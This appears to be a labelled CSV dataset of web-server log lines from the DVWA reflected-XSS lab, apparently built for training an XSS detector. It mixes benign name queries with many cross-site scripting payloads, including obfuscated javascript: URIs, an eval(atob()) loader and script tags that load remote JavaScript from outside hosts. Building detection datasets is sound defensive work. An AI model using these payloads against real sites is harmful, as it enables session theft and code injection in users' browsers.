,url,malicious
14072,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<plaintext onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
8376,"127.0.0.1 - - [03/May/2021:03:23:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nashville HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6194,"127.0.0.1 - - [03/May/2021:03:25:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sharla HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14617,"127.0.0.1 - - [03/May/2021:03:41:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>:target {color:red;}</style><acronym"" 400 0 ""-"" ""-""",1
1796,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<plaintext onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
4347,"127.0.0.1 - - [03/May/2021:03:17:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ijff HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12573,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sup onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
9082,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
8136,"127.0.0.1 - - [03/May/2021:03:07:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=pumpkin HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12915,"127.0.0.1 - - [03/May/2021:03:21:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marylynne HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2088,"127.0.0.1 - - [03/May/2021:03:21:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Malinde HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15972,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<small onblur=alert(1)"" 400 0 ""-"" ""-""",1
856,"127.0.0.1 - - [03/May/2021:02:34:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onMouseMove"" 400 0 ""-"" ""-""",1
4485,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT/XSS SRC=\""http://ha.ckers.org/xss.js\""></SCRIPT>"" 400 0 ""-"" ""-""",1
12140,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<plaintext ondblclick=\""alert(1)\"">test</plaintext>"" 400 0 ""-"" ""-""",1
5954,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<plaintext id=x"" 400 0 ""-"" ""-""",1
6505,"127.0.0.1 - - [03/May/2021:03:18:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jourdan HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
689,"127.0.0.1 - - [03/May/2021:03:05:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=c HTTP/1.1"" 200 1693 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11438,"127.0.0.1 - - [03/May/2021:03:08:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=upload HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2616,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noscript onmouseout=\""alert(1)\"">test</noscript>"" 400 0 ""-"" ""-""",1
11980,"127.0.0.1 - - [03/May/2021:03:21:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marshall HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8660,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ol onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
2451,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<link onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
4923,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figure id=x"" 400 0 ""-"" ""-""",1
13921,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onclick=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
17486,"127.0.0.1 - - [03/May/2021:03:16:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Foad HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18435,"127.0.0.1 - - [03/May/2021:03:07:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=oculto HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11471,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<header id=x"" 400 0 ""-"" ""-""",1
4119,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>');"" 400 0 ""-"" ""-""",1
6821,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pauline HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13679,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",1
8781,"127.0.0.1 - - [03/May/2021:03:13:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cinderella HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7079,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><u onload=alert(1)></u>"" 400 0 ""-"" ""-""",1
12503,"127.0.0.1 - - [03/May/2021:03:23:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nikoletta HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1649,"127.0.0.1 - - [03/May/2021:03:17:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Guner HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5287,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<xml id=\""xss\"""" 400 0 ""-"" ""-""",1
12940,"127.0.0.1 - - [03/May/2021:03:25:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shanti HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2440,"127.0.0.1 - - [03/May/2021:03:13:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chesteen HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5009,"127.0.0.1 - - [03/May/2021:03:12:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Charlotte HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8166,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",1
11853,"127.0.0.1 - - [03/May/2021:03:28:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vivianna HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18734,"127.0.0.1 - - [03/May/2021:03:19:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kayley HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15992,"127.0.0.1 - - [03/May/2021:03:20:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Laryssa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13687,"127.0.0.1 - - [03/May/2021:03:15:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Editha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12719,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<kbd onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
15320,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hallie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1389,"127.0.0.1 - - [03/May/2021:03:22:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mattie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3894,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--<img src=\""--><img"" 400 0 ""-"" ""-""",1
8609,"127.0.0.1 - - [03/May/2021:03:15:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Edyta HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17339,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hal HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12606,"127.0.0.1 - - [03/May/2021:03:04:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=tw2d HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5102,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3C HTTP/1.1"" 200 1693 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8602,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
12721,"127.0.0.1 - - [03/May/2021:03:26:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tab HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10665,"127.0.0.1 - - [03/May/2021:03:18:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jacquenette HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8193,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Technical HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6447,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x0Bcript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
18689,"127.0.0.1 - - [03/May/2021:03:17:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ilene HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2659,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<b onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
1784,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=http://yoursite.com/your_files.js></script>"" 400 0 ""-"" ""-""",1
8768,"127.0.0.1 - - [03/May/2021:03:24:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ram HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2586,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rp onblur=alert(1)"" 400 0 ""-"" ""-""",1
11908,"127.0.0.1 - - [03/May/2021:03:21:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marit HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5372,"127.0.0.1 - - [03/May/2021:03:12:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Charleen HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18616,"127.0.0.1 - - [03/May/2021:03:27:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vinay HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7261,"127.0.0.1 - - [03/May/2021:03:20:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Laura HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16359,"127.0.0.1 - - [03/May/2021:02:34:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onPageHide"" 400 0 ""-"" ""-""",1
8613,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=sonya HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17672,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""'`><p><svg><script>a='hello\\x27;javascript:alert(1)//';</script></p> HTTP/1.1"" 200 1734 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
3384,"127.0.0.1 - - [03/May/2021:03:05:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=attach HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10084,"127.0.0.1 - - [03/May/2021:03:25:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Robin HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17923,"127.0.0.1 - - [03/May/2021:03:22:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Miguel HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17061,"127.0.0.1 - - [03/May/2021:03:20:44 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Liviu HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7035,"127.0.0.1 - - [03/May/2021:03:15:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fawne HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10642,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javascript\\x3Ajavascript:alert(1)\"""" 400 0 ""-"" ""-""",1
18505,"127.0.0.1 - - [03/May/2021:03:05:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=cretin HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6232,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> HTTP/1.1"" 200 1728 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
11833,"127.0.0.1 - - [03/May/2021:03:07:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=profile HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5129,"127.0.0.1 - - [03/May/2021:03:12:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brigit HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12417,"127.0.0.1 - - [03/May/2021:03:14:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dis HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1658,"127.0.0.1 - - [03/May/2021:03:08:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=swearer HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3722,"127.0.0.1 - - [03/May/2021:03:25:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sandi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4830,"127.0.0.1 - - [03/May/2021:03:16:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Goldwyn HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9084,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<span id=x"" 400 0 ""-"" ""-""",1
1474,"127.0.0.1 - - [03/May/2021:03:40:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script/src=\""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1) HTTP/1.1"" 400 0 ""-"" ""-""",1
15752,"127.0.0.1 - - [03/May/2021:03:13:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Consuela HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1977,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div onclick=\""alert(1)\"">test</div>"" 400 0 ""-"" ""-""",1
2529,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js'"" 400 0 ""-"" ""-""",1
